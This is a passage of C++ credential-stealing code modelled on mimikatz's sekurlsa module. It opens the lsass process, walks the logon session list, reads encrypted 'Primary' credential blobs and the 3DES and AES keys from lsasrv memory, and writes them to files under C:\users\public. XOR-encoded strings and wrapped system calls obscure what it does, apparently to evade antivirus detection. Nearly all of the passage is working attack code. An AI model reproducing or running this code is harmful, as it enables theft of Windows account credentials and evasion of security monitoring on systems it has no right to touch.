    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 113; _fuckingstring[2] = 11; _fuckingstring[3] = 1; FBXorCrypt(_fuckingstring, 4);
    printf(_fuckingstring, (void*)(lsasrv + _logon_session_list_offset + 3));

    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 105; _fuckingstring[1] = 96; _fuckingstring[2] = 111; _fuckingstring[3] = 101; _fuckingstring[4] = 109; _fuckingstring[5] = 100; _fuckingstring[6] = 33; _fuckingstring[7] = 36; _fuckingstring[8] = 121; _fuckingstring[9] = 11; _fuckingstring[10] = 1; FBXorCrypt(_fuckingstring, 11);
    printf(_fuckingstring, _lsass_handle);

    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 78; _fuckingstring[1] = 74; _fuckingstring[2] = 50; _fuckingstring[3] = 50; _fuckingstring[4] = 50; _fuckingstring[5] = 50; _fuckingstring[6] = 50; _fuckingstring[7] = 50; _fuckingstring[8] = 50; _fuckingstring[9] = 50; _fuckingstring[10] = 50; _fuckingstring[11] = 50; _fuckingstring[12] = 50; _fuckingstring[13] = 1; FBXorCrypt(_fuckingstring, 14);
    MessageBoxA(NULL, _fuckingstring, "OK333", MB_OK);

#endif // DEBUG

    NT_ReadProcessMemory(_lsass_handle, (void*)(lsasrv + _logon_session_list_offset + 3), (void*)stack_string, 4, &bytesRead);

    // 



#ifdef DEBUG

    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 36; _fuckingstring[1] = 113; _fuckingstring[2] = 11; _fuckingstring[3] = 1; FBXorCrypt(_fuckingstring, 4);
    printf(_fuckingstring, (void*)(lsasrv + _logon_session_list_offset + 3));

    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 78; _fuckingstring[1] = 74; _fuckingstring[2] = 50; _fuckingstring[3] = 50; _fuckingstring[4] = 50; _fuckingstring[5] = 50; _fuckingstring[6] = 50; _fuckingstring[7] = 50; _fuckingstring[8] = 50; _fuckingstring[9] = 50; _fuckingstring[10] = 50; _fuckingstring[11] = 50; _fuckingstring[12] = 50; _fuckingstring[13] = 1; FBXorCrypt(_fuckingstring, 14);
    MessageBoxA(NULL, _fuckingstring, "OK333", MB_OK);

#endif // DEBUG

    DWORD _offset_rip = *(DWORD*)stack_string | (*(DWORD*)(stack_string + 1) << 8) | (*(DWORD*)(stack_string + 2) << 16) | (*(DWORD*)(stack_string + 3) << 24);

    char* _logon_session_list_addr = lsasrv + _logon_session_list_offset + 7 + _offset_rip;

#ifdef DEBUG

    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 94; _fuckingstring[1] = 109; _fuckingstring[2] = 110; _fuckingstring[3] = 102; _fuckingstring[4] = 110; _fuckingstring[5] = 111; _fuckingstring[6] = 94; _fuckingstring[7] = 114; _fuckingstring[8] = 100; _fuckingstring[9] = 114; _fuckingstring[10] = 114; _fuckingstring[11] = 104; _fuckingstring[12] = 110; _fuckingstring[13] = 111; _fuckingstring[14] = 94; _fuckingstring[15] = 109; _fuckingstring[16] = 104; _fuckingstring[17] = 114; _fuckingstring[18] = 117; _fuckingstring[19] = 94; _fuckingstring[20] = 96; _fuckingstring[21] = 101; _fuckingstring[22] = 101; _fuckingstring[23] = 115; _fuckingstring[24] = 33; _fuckingstring[25] = 36; _fuckingstring[26] = 113; _fuckingstring[27] = 11; _fuckingstring[28] = 1; FBXorCrypt(_fuckingstring, 29);
    printf(_fuckingstring, _logon_session_list_addr);

    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 78; _fuckingstring[1] = 74; _fuckingstring[2] = 50; _fuckingstring[3] = 50; _fuckingstring[4] = 50; _fuckingstring[5] = 50; _fuckingstring[6] = 50; _fuckingstring[7] = 50; _fuckingstring[8] = 50; _fuckingstring[9] = 50; _fuckingstring[10] = 50; _fuckingstring[11] = 50; _fuckingstring[12] = 50; _fuckingstring[13] = 1; FBXorCrypt(_fuckingstring, 14);
    MessageBoxA(NULL, _fuckingstring, "OK333", MB_OK);

#endif // DEBUG

    DWORD64 _DWORD64_logon_session_list_ARRAY_addr = reinterpret_cast<DWORD64>(_logon_session_list_addr);

#ifdef DEBUG

    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 94; _fuckingstring[1] = 69; _fuckingstring[2] = 86; _fuckingstring[3] = 78; _fuckingstring[4] = 83; _fuckingstring[5] = 69; _fuckingstring[6] = 55; _fuckingstring[7] = 53; _fuckingstring[8] = 94; _fuckingstring[9] = 109; _fuckingstring[10] = 110; _fuckingstring[11] = 102; _fuckingstring[12] = 110; _fuckingstring[13] = 111; _fuckingstring[14] = 94; _fuckingstring[15] = 114; _fuckingstring[16] = 100; _fuckingstring[17] = 114; _fuckingstring[18] = 114; _fuckingstring[19] = 104; _fuckingstring[20] = 110; _fuckingstring[21] = 111; _fuckingstring[22] = 94; _fuckingstring[23] = 109; _fuckingstring[24] = 104; _fuckingstring[25] = 114; _fuckingstring[26] = 117; _fuckingstring[27] = 94; _fuckingstring[28] = 64; _fuckingstring[29] = 83; _fuckingstring[30] = 83; _fuckingstring[31] = 64; _fuckingstring[32] = 88; _fuckingstring[33] = 94; _fuckingstring[34] = 96; _fuckingstring[35] = 101; _fuckingstring[36] = 101; _fuckingstring[37] = 115; _fuckingstring[38] = 33; _fuckingstring[39] = 36; _fuckingstring[40] = 121; _fuckingstring[41] = 11; _fuckingstring[42] = 1; FBXorCrypt(_fuckingstring, 43);
    printf(_fuckingstring, _DWORD64_logon_session_list_ARRAY_addr);

    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 78; _fuckingstring[1] = 74; _fuckingstring[2] = 50; _fuckingstring[3] = 50; _fuckingstring[4] = 50; _fuckingstring[5] = 50; _fuckingstring[6] = 50; _fuckingstring[7] = 50; _fuckingstring[8] = 50; _fuckingstring[9] = 50; _fuckingstring[10] = 50; _fuckingstring[11] = 50; _fuckingstring[12] = 50; _fuckingstring[13] = 1; FBXorCrypt(_fuckingstring, 14);
    MessageBoxA(NULL, _fuckingstring, "OK333", MB_OK);

#endif // DEBUG

    while (1) {

        char* _link_header = _logon_session_list_addr;

#ifdef DEBUG



        MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 94; _fuckingstring[1] = 109; _fuckingstring[2] = 104; _fuckingstring[3] = 111; _fuckingstring[4] = 106; _fuckingstring[5] = 94; _fuckingstring[6] = 105; _fuckingstring[7] = 100; _fuckingstring[8] = 96; _fuckingstring[9] = 101; _fuckingstring[10] = 100; _fuckingstring[11] = 115; _fuckingstring[12] = 33; _fuckingstring[13] = 96; _fuckingstring[14] = 101; _fuckingstring[15] = 101; _fuckingstring[16] = 115; _fuckingstring[17] = 100; _fuckingstring[18] = 114; _fuckingstring[19] = 114; _fuckingstring[20] = 59; _fuckingstring[21] = 33; _fuckingstring[22] = 36; _fuckingstring[23] = 113; _fuckingstring[24] = 11; _fuckingstring[25] = 1; FBXorCrypt(_fuckingstring, 26);
        printf(_fuckingstring, _link_header);

#endif // DEBUG

        while (1) {

            // logonsessionlist

            // 8

            MYS_ecureZeroMemory(stack_string, 50);

            bytesRead = 0;

            NT_ReadProcessMemory(_lsass_handle, (void*)_logon_session_list_addr, (void*)stack_string, 8, &bytesRead);

            DWORD64 _next_node_addr = *(reinterpret_cast<DWORD64*>(stack_string));

#ifdef DEBUG



            MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 94; _fuckingstring[1] = 111; _fuckingstring[2] = 100; _fuckingstring[3] = 121; _fuckingstring[4] = 117; _fuckingstring[5] = 94; _fuckingstring[6] = 111; _fuckingstring[7] = 110; _fuckingstring[8] = 101; _fuckingstring[9] = 100; _fuckingstring[10] = 94; _fuckingstring[11] = 96; _fuckingstring[12] = 101; _fuckingstring[13] = 101; _fuckingstring[14] = 115; _fuckingstring[15] = 33; _fuckingstring[16] = 96; _fuckingstring[17] = 101; _fuckingstring[18] = 101; _fuckingstring[19] = 115; _fuckingstring[20] = 100; _fuckingstring[21] = 114; _fuckingstring[22] = 114; _fuckingstring[23] = 59; _fuckingstring[24] = 33; _fuckingstring[25] = 36; _fuckingstring[26] = 113; _fuckingstring[27] = 11; _fuckingstring[28] = 1; FBXorCrypt(_fuckingstring, 29);
            printf(_fuckingstring, _link_header);

#endif // DEBUG

            // 

            if (0 == _next_node_addr || _link_header == reinterpret_cast<char*>(_next_node_addr)) {

                break;

            }

            _logon_session_list_addr = reinterpret_cast<char*>(_next_node_addr);



#ifdef DEBUG

            MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 11; _fuckingstring[1] = 11; _fuckingstring[2] = 11; _fuckingstring[3] = 11; _fuckingstring[4] = 94; _fuckingstring[5] = 109; _fuckingstring[6] = 110; _fuckingstring[7] = 102; _fuckingstring[8] = 110; _fuckingstring[9] = 111; _fuckingstring[10] = 94; _fuckingstring[11] = 114; _fuckingstring[12] = 100; _fuckingstring[13] = 114; _fuckingstring[14] = 114; _fuckingstring[15] = 104; _fuckingstring[16] = 110; _fuckingstring[17] = 111; _fuckingstring[18] = 94; _fuckingstring[19] = 109; _fuckingstring[20] = 104; _fuckingstring[21] = 114; _fuckingstring[22] = 117; _fuckingstring[23] = 94; _fuckingstring[24] = 96; _fuckingstring[25] = 101; _fuckingstring[26] = 101; _fuckingstring[27] = 115; _fuckingstring[28] = 33; _fuckingstring[29] = 111; _fuckingstring[30] = 110; _fuckingstring[31] = 101; _fuckingstring[32] = 100; _fuckingstring[33] = 33; _fuckingstring[34] = 96; _fuckingstring[35] = 101; _fuckingstring[36] = 101; _fuckingstring[37] = 115; _fuckingstring[38] = 59; _fuckingstring[39] = 33; _fuckingstring[40] = 36; _fuckingstring[41] = 113; _fuckingstring[42] = 11; _fuckingstring[43] = 1; FBXorCrypt(_fuckingstring, 44);
            printf(_fuckingstring, _logon_session_list_addr);

#endif // DEBUG





            // logonsessionlist

            // mimikatz

            // C:\Users\123\Downloads\mimikatz-main\mimikatz-master (1)\mimikatz\modules\sekurlsa\kuhl_m_sekurlsa.c#L300

            // win100x108

            // main

            char* _p_credential_addr = _logon_session_list_addr + _credential_offset;

            // credential

            // lsass

            MYS_ecureZeroMemory(stack_string, 50);

            bytesRead = 0;



#ifdef DEBUG

            MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 94; _fuckingstring[1] = 113; _fuckingstring[2] = 94; _fuckingstring[3] = 98; _fuckingstring[4] = 115; _fuckingstring[5] = 100; _fuckingstring[6] = 101; _fuckingstring[7] = 100; _fuckingstring[8] = 111; _fuckingstring[9] = 117; _fuckingstring[10] = 104; _fuckingstring[11] = 96; _fuckingstring[12] = 109; _fuckingstring[13] = 94; _fuckingstring[14] = 96; _fuckingstring[15] = 101; _fuckingstring[16] = 101; _fuckingstring[17] = 115; _fuckingstring[18] = 33; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 101; _fuckingstring[22] = 115; _fuckingstring[23] = 59; _fuckingstring[24] = 33; _fuckingstring[25] = 36; _fuckingstring[26] = 113; _fuckingstring[27] = 11; _fuckingstring[28] = 1; FBXorCrypt(_fuckingstring, 29);
            printf(_fuckingstring, _p_credential_addr);

#endif // DEBUG



            // continue

            if (!NT_ReadProcessMemory(_lsass_handle, (void*)_p_credential_addr, (void*)stack_string, 8, &bytesRead))continue;



            // DWORD64

            DWORD64 _credential_addr = *(reinterpret_cast<DWORD64*>(stack_string));

            // _credential_addrpackageID

            // Primarypackageid3+8dwordpackageid

            // packageid3

            while (1) {

                // packageID

                MYS_ecureZeroMemory(stack_string, 50);

                if (!NT_ReadProcessMemory(_lsass_handle, reinterpret_cast<void*>(_credential_addr + 8), (void*)stack_string, 8, &bytesRead)) {

                    break; continue;

                }

                DWORD _package_id = *(reinterpret_cast<DWORD*>(stack_string));

                if (3 == _package_id) {

                    // 

                    // _credential_addrbreak

                    break;

                }

                else {

                    // 

                    MYS_ecureZeroMemory(stack_string, 50);

                    // 

                    if (!NT_ReadProcessMemory(_lsass_handle, reinterpret_cast<void*>(_credential_addr), (void*)stack_string, 8, &bytesRead)) {

                        break; continue;

                    }

                    _credential_addr = *(reinterpret_cast<DWORD64*>(stack_string));

                    // 

                    if (0 == _credential_addr)break;

                }

            }





            // +0x10

            MYS_ecureZeroMemory(stack_string, 50);

            bytesRead = 0;



#ifdef DEBUG

            MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 94; _fuckingstring[1] = 98; _fuckingstring[2] = 115; _fuckingstring[3] = 100; _fuckingstring[4] = 101; _fuckingstring[5] = 100; _fuckingstring[6] = 111; _fuckingstring[7] = 117; _fuckingstring[8] = 104; _fuckingstring[9] = 96; _fuckingstring[10] = 109; _fuckingstring[11] = 94; _fuckingstring[12] = 96; _fuckingstring[13] = 101; _fuckingstring[14] = 101; _fuckingstring[15] = 115; _fuckingstring[16] = 59; _fuckingstring[17] = 33; _fuckingstring[18] = 36; _fuckingstring[19] = 113; _fuckingstring[20] = 11; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
            printf(_fuckingstring, _credential_addr);

#endif // DEBUG





#ifdef DEBUG

            MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 94; _fuckingstring[1] = 113; _fuckingstring[2] = 94; _fuckingstring[3] = 114; _fuckingstring[4] = 100; _fuckingstring[5] = 98; _fuckingstring[6] = 110; _fuckingstring[7] = 111; _fuckingstring[8] = 101; _fuckingstring[9] = 94; _fuckingstring[10] = 109; _fuckingstring[11] = 100; _fuckingstring[12] = 119; _fuckingstring[13] = 100; _fuckingstring[14] = 109; _fuckingstring[15] = 94; _fuckingstring[16] = 98; _fuckingstring[17] = 115; _fuckingstring[18] = 100; _fuckingstring[19] = 101; _fuckingstring[20] = 100; _fuckingstring[21] = 111; _fuckingstring[22] = 117; _fuckingstring[23] = 104; _fuckingstring[24] = 96; _fuckingstring[25] = 109; _fuckingstring[26] = 94; _fuckingstring[27] = 96; _fuckingstring[28] = 101; _fuckingstring[29] = 101; _fuckingstring[30] = 115; _fuckingstring[31] = 59; _fuckingstring[32] = 33; _fuckingstring[33] = 36; _fuckingstring[34] = 113; _fuckingstring[35] = 11; _fuckingstring[36] = 1; FBXorCrypt(_fuckingstring, 37);
            printf(_fuckingstring, _credential_addr + 0x10);

#endif // DEBUG



            if (!NT_ReadProcessMemory(_lsass_handle, (void*)(_credential_addr + 0x10), (void*)stack_string, 8, &bytesRead))continue;

            DWORD64 _second_level_credential_addr = *(reinterpret_cast<DWORD64*>(stack_string));

            // 0x100x1aword

            MYS_ecureZeroMemory(stack_string, 50);

            bytesRead = 0;



#ifdef DEBUG

            MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 94; _fuckingstring[1] = 114; _fuckingstring[2] = 100; _fuckingstring[3] = 98; _fuckingstring[4] = 110; _fuckingstring[5] = 111; _fuckingstring[6] = 101; _fuckingstring[7] = 94; _fuckingstring[8] = 109; _fuckingstring[9] = 100; _fuckingstring[10] = 119; _fuckingstring[11] = 100; _fuckingstring[12] = 109; _fuckingstring[13] = 94; _fuckingstring[14] = 98; _fuckingstring[15] = 115; _fuckingstring[16] = 100; _fuckingstring[17] = 101; _fuckingstring[18] = 100; _fuckingstring[19] = 111; _fuckingstring[20] = 117; _fuckingstring[21] = 104; _fuckingstring[22] = 96; _fuckingstring[23] = 109; _fuckingstring[24] = 94; _fuckingstring[25] = 96; _fuckingstring[26] = 101; _fuckingstring[27] = 101; _fuckingstring[28] = 115; _fuckingstring[29] = 59; _fuckingstring[30] = 33; _fuckingstring[31] = 36; _fuckingstring[32] = 113; _fuckingstring[33] = 11; _fuckingstring[34] = 1; FBXorCrypt(_fuckingstring, 35);
            printf(_fuckingstring, reinterpret_cast<void*>(_second_level_credential_addr));

#endif // DEBUG



            if (!NT_ReadProcessMemory(_lsass_handle, (void*)(_second_level_credential_addr + 0x1a), (void*)stack_string, 2, &bytesRead))continue;

            DWORD _cipher_length = *(reinterpret_cast<WORD*>(stack_string));





#ifdef DEBUG

            MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 94; _fuckingstring[1] = 98; _fuckingstring[2] = 104; _fuckingstring[3] = 113; _fuckingstring[4] = 105; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 94; _fuckingstring[8] = 109; _fuckingstring[9] = 100; _fuckingstring[10] = 111; _fuckingstring[11] = 102; _fuckingstring[12] = 117; _fuckingstring[13] = 105; _fuckingstring[14] = 59; _fuckingstring[15] = 33; _fuckingstring[16] = 36; _fuckingstring[17] = 101; _fuckingstring[18] = 11; _fuckingstring[19] = 1; FBXorCrypt(_fuckingstring, 20);
            printf(_fuckingstring, _cipher_length);

#endif // DEBUG



            char* buffer = (char*)0;

            if (_cipher_length > 0x400) {

                char _temp_stack[0x500];

                MYS_ecureZeroMemory(_temp_stack, 0x500);

                buffer = _temp_stack;

            }

            else if (_cipher_length > 0x300) {

                char _temp_stack[0x400];

                MYS_ecureZeroMemory(_temp_stack, 0x400);

                buffer = _temp_stack;

            }

            else if (_cipher_length > 0x200) {

                char _temp_stack[0x300];

                MYS_ecureZeroMemory(_temp_stack, 0x300);

                buffer = _temp_stack;

            }

            else if (_cipher_length > 0x100) {

                char _temp_stack[0x200];

                MYS_ecureZeroMemory(_temp_stack, 0x200);

                buffer = _temp_stack;

            }

            else {

                char _temp_stack[0x100];

                MYS_ecureZeroMemory(_temp_stack, 0x100);

                buffer = _temp_stack;

            }

            bytesRead = 0;

            // 

            /*

    00000294`7a4765e0 0000000000000000      unknown

    00000294`7a4765e8 0000000000080007      packageID

    00000294`7a4765f0 000002947a476608      primary

    00000294`7a4765f8 0000000001b001a8      maxlenlen

    00000294`7a476600 000002947a476610

    00000294`7a476608 007972616d697250      primary     [offset: 0x28]

    00000294`7a476610 7742f497b51510ca

    00000294`7a476618 49d4b3bd4c920307

            */

            if (!NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_second_level_credential_addr + 0x28)), (void*)buffer, _cipher_length, &bytesRead))continue;



            // 



            // 

            MYS_ecureZeroMemory(stack_string, 50);



            MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 106; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
            hFile = NT_CreateFileA(_fuckingstring,                   // File path

                FILE_APPEND_DATA,              // Access mode (write)

                0,                          // Share mode (no sharing)

                NULL,                       // Security attributes (default)

                OPEN_ALWAYS,              // Creation disposition (always create a new file)

                FILE_ATTRIBUTE_NORMAL,      // File attributes (normal)

                NULL                        // Template file (not used)

            );



            if (hFile == INVALID_HANDLE_VALUE) {

                //fprintf(stderr, "Error creating/opening the file\n");

                return 1;

            }



            // Convert the WORD to a byte array

            BYTE byteArray[4];



            // 4

            byteArray[0] = (BYTE)(_cipher_length & 0xFF);         // Low byte

            byteArray[1] = (BYTE)((_cipher_length >> 8) & 0xFF);  // High byte

            byteArray[2] = (BYTE)((_cipher_length >> 16) & 0xFF);  // High byte

            byteArray[3] = (BYTE)((_cipher_length >> 24) & 0xFF);  // High byte 



            // Write the byte array to the file

            DWORD bytesWritten;

            if (!NT_WriteFile(hFile, byteArray, sizeof(byteArray), &bytesWritten, NULL)) {

                //fprintf(stderr, "Error writing to the file\n");

                NT_CloseHandle(hFile);

                return 1;

            }



            //ZeroMemory(_123, 100);

           // //sprintf(_123, "lsass and lsasrv module located at: %p and %p\n", lsass, lsasrv);

            // OutputDebugStringA("cipher length write in\n");

            // 

            DWORD _out_para = 0;

            if (!NT_WriteFile(hFile, buffer, _cipher_length, &_out_para, NULL)) {

                //fprintf(stderr, "Error writing to the file\n");

                NT_CloseHandle(hFile);

                return 1;

            }

            // OutputDebugStringA("cipher  write in\n");

            // 

            NT_CloseHandle(hFile);

        }



        // _logon_session_list_ARRAY_addr80

        _DWORD64_logon_session_list_ARRAY_addr += 0x10;

        MYS_ecureZeroMemory(stack_string, 50);

        bytesRead = 0;

        NT_ReadProcessMemory(_lsass_handle, (void*)_DWORD64_logon_session_list_ARRAY_addr, (void*)stack_string, 8, &bytesRead);

        DWORD64 _next_link_list_addr = *(reinterpret_cast<DWORD64*>(stack_string));

        if (0 == _next_link_list_addr) {

            break;

        }

        _logon_session_list_addr = reinterpret_cast<char*>(_DWORD64_logon_session_list_ARRAY_addr);

    }

    //ZeroMemory(_123, 100);

    // //sprintf(_123, "lsass and lsasrv module located at: %p and %p\n", lsass, lsasrv);

    // OutputDebugStringA("logon session list iterate done!\n");

    // 3desaeskey

    bytesRead = 0;

    MYS_ecureZeroMemory(stack_string, 50);

    NT_ReadProcessMemory(_lsass_handle, (void*)(lsasrv + _3des_key_offset + 3), (void*)stack_string, 4, &bytesRead);

    _offset_rip = *(DWORD*)stack_string | (*(DWORD*)(stack_string + 1) << 8) | (*(DWORD*)(stack_string + 2) << 16) | (*(DWORD*)(stack_string + 3) << 24);

    char* _1_3des_addr = lsasrv + _3des_key_offset + 7 + _offset_rip;

    // QWORD

    MYS_ecureZeroMemory(stack_string, 50);

    NT_ReadProcessMemory(_lsass_handle, (void*)_1_3des_addr, (void*)stack_string, 8, &bytesRead);

    DWORD64 _2_3des_addr = *(reinterpret_cast<DWORD64*>(stack_string));

    MYS_ecureZeroMemory(stack_string, 50);

    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_2_3des_addr + 0x10)), (void*)stack_string, 8, &bytesRead);



    DWORD64 _3_3des_addr = *(reinterpret_cast<DWORD64*>(stack_string));

    // 

    MYS_ecureZeroMemory(stack_string, 50);

    // windows70x180x38

    // 

    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_3des_addr + _3des_aes_len_offset)), (void*)stack_string, 4, &bytesRead);

    DWORD _3des_len = *(reinterpret_cast<DWORD*>(stack_string));





    MYS_ecureZeroMemory(stack_string, 50);

    // 

    // 3iaad



    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 50; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
    hFile = NT_CreateFileA(_fuckingstring,                   // File path

        FILE_APPEND_DATA,              // Access mode (write)

        0,                          // Share mode (no sharing)

        NULL,                       // Security attributes (default)

        OPEN_ALWAYS,              // Creation disposition (always create a new file)

        FILE_ATTRIBUTE_NORMAL,      // File attributes (normal)

        NULL                        // Template file (not used)

    );



    if (hFile == INVALID_HANDLE_VALUE) {

        //fprintf(stderr, "Error creating/opening the file\n");

        return 1;

    }



    MYS_ecureZeroMemory(stack_string, 50);

    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_3des_addr + _3des_aes_len_offset + 4)), (void*)stack_string, _3des_len, &bytesRead);



    BYTE byteArray[4];

    // 4

    byteArray[0] = (BYTE)(_3des_len & 0xFF);         // Low byte

    byteArray[1] = (BYTE)((_3des_len >> 8) & 0xFF);  // High byte

    byteArray[2] = (BYTE)((_3des_len >> 16) & 0xFF);  // High byte

    byteArray[3] = (BYTE)((_3des_len >> 24) & 0xFF);  // High byte 



    // Write the byte array to the file

    DWORD bytesWritten;

    if (!NT_WriteFile(hFile, byteArray, sizeof(byteArray), &bytesWritten, NULL)) {

        //   fprintf(stderr, "Error writing to the file\n");

        NT_CloseHandle(hFile);

        return 1;

    }





    //ZeroMemory(_123, 100);

    // //sprintf(_123, "lsass and lsasrv module located at: %p and %p\n", lsass, lsasrv);

    // OutputDebugStringA("3des key  length write in\n");

    // 

    DWORD _out_para = 0;

    if (!NT_WriteFile(hFile, stack_string, _3des_len, &_out_para, NULL)) {

        // fprintf(stderr, "Error writing to the file\n");

        NT_CloseHandle(hFile);

        return 1;

    }

    // OutputDebugStringA("3des key   write in\n");

    // 

    NT_CloseHandle(hFile);



    // aes key

    // offset_aes_key_offset

    bytesRead = 0;

    MYS_ecureZeroMemory(stack_string, 50);

    NT_ReadProcessMemory(_lsass_handle, (void*)(lsasrv + _aes_key_offset + 3), (void*)stack_string, 4, &bytesRead);

    _offset_rip = *(DWORD*)stack_string | (*(DWORD*)(stack_string + 1) << 8) | (*(DWORD*)(stack_string + 2) << 16) | (*(DWORD*)(stack_string + 3) << 24);

    char* _1_aes_addr = lsasrv + _aes_key_offset + 7 + _offset_rip;

    // QWORD

    MYS_ecureZeroMemory(stack_string, 50);

    NT_ReadProcessMemory(_lsass_handle, (void*)_1_aes_addr, (void*)stack_string, 8, &bytesRead);

    DWORD64 _2_aes_addr = *(reinterpret_cast<DWORD64*>(stack_string));

    MYS_ecureZeroMemory(stack_string, 50);

    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_2_aes_addr + 0x10)), (void*)stack_string, 8, &bytesRead);



    DWORD64 _3_aes_addr = *(reinterpret_cast<DWORD64*>(stack_string));

    // 

    MYS_ecureZeroMemory(stack_string, 50);

    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_aes_addr + _3des_aes_len_offset)), (void*)stack_string, 4, &bytesRead);

    DWORD _aes_len = *(reinterpret_cast<DWORD*>(stack_string));







    MYS_ecureZeroMemory(stack_string, 50);

    // 

    // aiaad



    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 66; _fuckingstring[1] = 59; _fuckingstring[2] = 93; _fuckingstring[3] = 116; _fuckingstring[4] = 114; _fuckingstring[5] = 100; _fuckingstring[6] = 115; _fuckingstring[7] = 114; _fuckingstring[8] = 93; _fuckingstring[9] = 113; _fuckingstring[10] = 116; _fuckingstring[11] = 99; _fuckingstring[12] = 109; _fuckingstring[13] = 104; _fuckingstring[14] = 98; _fuckingstring[15] = 93; _fuckingstring[16] = 96; _fuckingstring[17] = 104; _fuckingstring[18] = 96; _fuckingstring[19] = 96; _fuckingstring[20] = 101; _fuckingstring[21] = 1; FBXorCrypt(_fuckingstring, 22);
    hFile = NT_CreateFileA(_fuckingstring,                   // File path

        FILE_APPEND_DATA,              // Access mode (write)

        0,                          // Share mode (no sharing)

        NULL,                       // Security attributes (default)

        OPEN_ALWAYS,              // Creation disposition (always create a new file)

        FILE_ATTRIBUTE_NORMAL,      // File attributes (normal)

        NULL                        // Template file (not used)

    );



    if (hFile == INVALID_HANDLE_VALUE) {

        // fprintf(stderr, "Error creating/opening the file\n");

        return 1;

    }



    MYS_ecureZeroMemory(stack_string, 50);

    NT_ReadProcessMemory(_lsass_handle, (void*)(reinterpret_cast<void*>(_3_aes_addr + _3des_aes_len_offset + 4)), (void*)stack_string, _aes_len, &bytesRead);

    // 4

    byteArray[0] = (BYTE)(_aes_len & 0xFF);         // Low byte

    byteArray[1] = (BYTE)((_aes_len >> 8) & 0xFF);  // High byte

    byteArray[2] = (BYTE)((_aes_len >> 16) & 0xFF);  // High byte

    byteArray[3] = (BYTE)((_aes_len >> 24) & 0xFF);  // High byte





    //ZeroMemory(_123, 100);

    // //sprintf(_123, "lsass and lsasrv module located at: %p and %p\n", lsass, lsasrv);

    // OutputDebugStringA("aes key  length write in\n");

    // Write the byte array to the file

    if (!NT_WriteFile(hFile, byteArray, sizeof(byteArray), &bytesWritten, NULL)) {

        // fprintf(stderr, "Error writing to the file\n");

        NT_CloseHandle(hFile);

        return 1;

    }



    //ZeroMemory(_123, 100);

    // //sprintf(_123, "lsass and lsasrv module located at: %p and %p\n", lsass, lsasrv);

    // OutputDebugStringA("aes   key write in\n");

    // 

    if (!NT_WriteFile(hFile, stack_string, _aes_len, &_out_para, NULL)) {

        // fprintf(stderr, "mainError writing to the file\n");

        NT_CloseHandle(hFile);

        return 1;

    }



    // 

    NT_CloseHandle(hFile);



#ifdef DEBU___G



    MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 111; _fuckingstring[1] = 110; _fuckingstring[2] = 115; _fuckingstring[3] = 108; _fuckingstring[4] = 96; _fuckingstring[5] = 109; _fuckingstring[6] = 33; _fuckingstring[7] = 114; _fuckingstring[8] = 100; _fuckingstring[9] = 112; _fuckingstring[10] = 116; _fuckingstring[11] = 100; _fuckingstring[12] = 111; _fuckingstring[13] = 98; _fuckingstring[14] = 100; _fuckingstring[15] = 11; _fuckingstring[16] = 1; FBXorCrypt(_fuckingstring, 17);
    printf(_fuckingstring);

#endif // DEBU___G





    //ZeroMemory(_123, 100);

    // //sprintf(_123, "lsass and lsasrv module located at: %p and %p\n", lsass, lsasrv);

    // OutputDebugStringA("all is done\n");

